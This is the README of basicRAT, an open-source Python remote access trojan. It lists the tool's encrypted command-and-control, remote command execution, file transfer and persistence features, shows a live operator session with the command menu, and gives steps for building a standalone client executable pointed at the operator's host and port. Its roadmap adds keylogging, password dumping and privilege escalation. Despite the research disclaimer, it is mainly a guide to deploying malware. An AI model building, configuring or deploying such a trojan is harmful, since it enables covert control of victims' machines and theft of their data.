# basicRAT

This is a Python RAT (Remote Access Trojan), basicRAT was created to maintain a clean design full-featured Python RAT. Currently a work in progress and still being hacked on.

**Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems. Accessing a computer system or network without authorization or explicit permission is illegal.**

## Features
* Cross-platform
* AES CBC encrypted C2 with D-H exchange
* Accepts connection from multiple clients
* Command execution
* File upload/download
* Standard utilities (wget, unzip)
* System survey

## Usage
```
$ python basicRAT_server.py --port 1337

 ____    ____  _____ ____   __  ____    ____  ______      .  ,
|    \  /    |/ ___/|    | /  ]|    \  /    ||      |    (\;/)
|  o  )|  o  (   \_  |  | /  / |  D  )|  o  ||      |   oo   \//,        _
|     ||     |\__  | |  |/  /  |    / |     ||_|  |_| ,/_;~      \,     / '
|  O  ||  _  |/  \ | |  /   \_ |    \ |  _  |  |  |   "'    (  (   \    !
|     ||  |  |\    | |  \     ||  .  \|  |  |  |  |         //  \   |__.'
|_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
         https://github.com/vesche/basicRAT

basicRAT server listening for connections on port 1337.

[?] basicRAT> help

client <id>         - Connect to a client.
clients             - List connected clients.
download <files>    - Download file(s).
help                - Show this help menu.
kill                - Kill the client connection.
persistence         - Apply persistence mechanism.
quit                - Exit the server and end all client connections.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.

[?] basicRAT> clients
ID - Client Address
 1 - 127.0.0.1

[?] basicRAT> client 1

[1] basicRAT> run uname -a
Linux sandbox3 4.8.13-1-ARCH #1 SMP PREEMPT Fri Dec 9 07:24:34 CET 2016 x86_64 GNU/Linux
```

## Build a stand-alone executable
Keep in mind that before building you will likely want to modify both the `HOST` and `PORT` variables located at the top of `basicRAT_client.py` to fit your needs.

On Linux you will need Python 2.x, [PyInstaller](http://www.pyinstaller.org/), and pycrypto. Then run something like `pyinstaller2 --onefile basicRAT_client.py` and it should generate a `dist/` folder that contains a stand-alone ELF executable.

On Windows you will need Python 2.x, PyInstaller, pycrypto, pywin32, and pefile. Then run something like `C:\path\to\PyInstaller-3.2\PyInstaller-3.2\pyinstaller.py --onefile basicRAT_client.py` and it should generate a `dist/` folder that contains a stand-alone PE (portable executable).

## Todo
* Client binary generation tool (cross-platform)
  * Pyinstaller
  * Switch options for remote IP, port, etc
* Persistance (cross-platform)
  * Windows: Registry keys, WMIC, Startup Dir
  * Linux: Cron jobs, services, modprobe
* Common C2 Protocols (HTTP, DNS)
* Privilege Escalation (getsystem-esque, dirty cow)
* Screenshot
* Keylogger
* Expand toolkit (unrar, sysinfo)
* Scanning utility (probe scan / ping sweep, scanning subnet)
* Password dumping (mimikatz / gsecdump)
* Tunneling
* Client periodic connection attempt

## Authors
* Austin Jackson [@vesche](https://github.com/vesche)
* Skyler Curtis [@deadPix3l](https://github.com/deadPix3l)

## Thanks
* [@bozhu](https://github.com/bozhu), AES-GCM Python implementation.
* [@reznok](https://github.com/reznok), multiple client connection prototype.

## Other open-source Python RATs for Reference
* [ahhh/Reverse_DNS_Shell](https://github.com/ahhh/Reverse_DNS_Shell)
* [sweetsoftware/Ares](https://github.com/sweetsoftware/Ares)
